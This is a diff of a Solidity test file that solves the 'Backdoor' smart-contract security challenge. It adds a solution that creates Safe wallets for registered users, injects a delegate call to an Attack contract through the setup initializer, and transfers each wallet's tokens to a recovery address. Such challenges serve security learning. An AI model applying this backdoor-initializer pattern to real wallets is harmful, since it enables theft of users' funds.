@@ -4,9 +4,10 @@ pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
 import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {Attack} from "./Attack.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -17,7 +18,7 @@ contract BackdoorChallenge is Test {
     uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
 
     DamnValuableToken token;
-    Safe singletonCopy;
+    Safe singletonCopy; 
     SafeProxyFactory walletFactory;
     WalletRegistry walletRegistry;
 
@@ -69,7 +70,36 @@ contract BackdoorChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_backdoor() public checkSolvedByPlayer {}
+    function test_backdoor() public checkSolvedByPlayer {
+        Attack attack = new Attack(token);
+        bytes memory attackData = abi.encodeWithSelector(Attack.attack.selector);
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory owners = new address[](1);
+            owners[0] = users[i];
+            
+            bytes memory initializer = abi.encodeWithSelector (
+            Safe.setup.selector,
+            owners,               // _owners - Array of wallet owners                    NCT: is checked in registry
+            1,                       // _threshold - Number of required confirmations       NCT: is checked in registry
+            address(attack),         // to - Contract address for optional delegate call    
+            attackData,              // data - Data payload for optional delegate call
+            address(0),              // fallbackHandler - Handler for fallback calls        NCT: is checked in registry
+            address(0),              // paymentToken - Token used for payment (0 is ETH)
+            0,                       // payment - Value that should be paid
+            address(0)               // paymentReceiver - Address to receive payment
+            );
+            
+            SafeProxy proxy = walletFactory.createProxyWithCallback(
+                address(singletonCopy),
+                initializer,
+                0,
+                walletRegistry
+            );
+
+            token.transferFrom(address(proxy), recovery, token.balanceOf(address(proxy)));
+        }
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
